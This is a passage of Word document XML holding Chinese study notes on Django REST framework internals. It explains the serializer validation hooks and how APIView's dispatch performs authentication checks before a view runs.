      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>valiate</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法的返回值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BDF2991" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">　　如果在我们自己写的序列化类中重写了全局钩子，也就是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>def validate()</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，那么最后一步就会执行我们自己写的全局钩子进行校验。如果没有就走模块自己的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>validate</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法，这个方法没有进行任何操作，直接把传入的参数作为返回值返回了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4A58EC" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>to_internal_value</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法是局部钩子的校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E4226E1" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="150" w:after="150"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rest_framework/serializes.py/class Serializer/def to_internal_value()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADA7B14" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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51644490" wp14:editId="0EA72959">
            <wp:extent cx="6817341" cy="2899954"/>
            <wp:effectExtent l="0" t="0" r="3175" b="0"/>
            <wp:docPr id="36" name="图片 36">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8032" cy="2913009"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB072FA"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这是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>to_internal_value</w:t>
      </w:r>
      <w:r w:rsidRPr="00E912B5">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法的部分源码，它先找了我们自己写的局部钩子校验的方法，然后将数据传入，校验后返回。传入的是单个的数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E37A9F2" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="00E912B5" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="a8"/>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>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以上是</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相关的源码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="387FB3E8" w14:textId="77777777" w:rsidR="00E912B5" w:rsidRPr="008A1DE1" w:rsidRDefault="00E912B5" w:rsidP="0049386C">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
          <w:rtl/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rStyle w:val="devslash"/>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="5D69A5"/>
          <w:sz w:val="49"/>
          <w:szCs w:val="49"/>
        </w:rPr>
        <w:t>|</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="008A1DE1">
        <w:rPr>
          <w:rStyle w:val="devtitle"/>
          <w:rFonts w:ascii="Microsoft JhengHei" w:eastAsia="Microsoft JhengHei" w:hAnsi="Microsoft JhengHei" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="222222"/>
          <w:sz w:val="38"/>
          <w:szCs w:val="38"/>
        </w:rPr>
        <w:t>APIView(二)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1625A306"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在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法的时候，它不仅做了分发函数的功能，还进行了一系列的校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CEBEB8E"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Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的全局校验一般写在中间件中，但是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rest_framework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>原生框架而言只是一个应用（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Application</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>），它实现全局校验的方法比较特殊，首先规定所有的视图都要以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的形式写在类当中，这个类要继承</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rest_framework</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>或者继承了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的子类。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>CBV</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>中我们知道，有一个分发函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>APIView</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>重写了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，使得</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>在把请求分配给不同的方法执行之前，先进行了一些校验，虽然这层校验仅仅近似于中间件的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>process_view</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>，但也达到了全局校验的效果，为我们写全局校验提供了思路，而且这种校验的好处在于，它比较灵活，想进行校验的时候就重写一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法，只对某些视图函数进行校验。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B88046"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rest_framework/views/class APIView/def dispatch()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E1DE787"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3DE9F76D" wp14:editId="53C5DDFF">
            <wp:extent cx="7350034" cy="1744980"/>
            <wp:effectExtent l="0" t="0" r="3810" b="7620"/>
            <wp:docPr id="53" name="图片 5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61669" cy="1747742"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4807AD"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dispatch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>在执行视图函数之前先执行了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>initial</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325B4553"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rest_framework/views/class APIView/def initial()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727F53F2"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68E271D3" wp14:editId="5235A4F6">
            <wp:extent cx="7787005" cy="3735705"/>
            <wp:effectExtent l="0" t="0" r="4445" b="0"/>
            <wp:docPr id="52" name="图片 52">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813389" cy="3748362"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C4601B"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依次执行了三层校验。分别来看</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA7A295"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rest_framework/views/class APIView/def perform_authentication()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4314FF80"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6F064E20" wp14:editId="5FF01CE1">
            <wp:extent cx="6451026" cy="1722120"/>
            <wp:effectExtent l="0" t="0" r="6985" b="0"/>
            <wp:docPr id="51" name="图片 5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69801" cy="1727132"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="179AB562"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这个函数只是调用了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>封装成属性的方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="252D28F3"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rest_framework/request/class Request/def user()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5088BC88"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1990DC4D" wp14:editId="65603369">
            <wp:extent cx="7271657" cy="2638425"/>
            <wp:effectExtent l="0" t="0" r="5715" b="0"/>
            <wp:docPr id="50" name="图片 5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84059" cy="2642925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B58779"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这里也是用了类似单例的模式，避免了重复执行函数，造成资源的浪费。重点看</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_authenticate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571AED2B"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rest_framework/request/class Request/def _authenticate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F097E03"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36A14140" wp14:editId="635102A0">
            <wp:extent cx="7720330" cy="3009900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="49" name="图片 49">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749479" cy="3021264"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A340870"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要理解这段源码，还需要再找到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>类的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>authenticators</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6934983C"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rest_framework/request/class Request/def __init__()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21C1370D"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35DE8DD1" wp14:editId="35F34EA9">
            <wp:extent cx="9028953" cy="2766060"/>
            <wp:effectExtent l="0" t="0" r="1270" b="0"/>
            <wp:docPr id="48" name="图片 48">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081738" cy="2782231"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C69ADDD"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这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="Microsoft JhengHei" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>类的构造函数，当</w:t>
      </w:r>
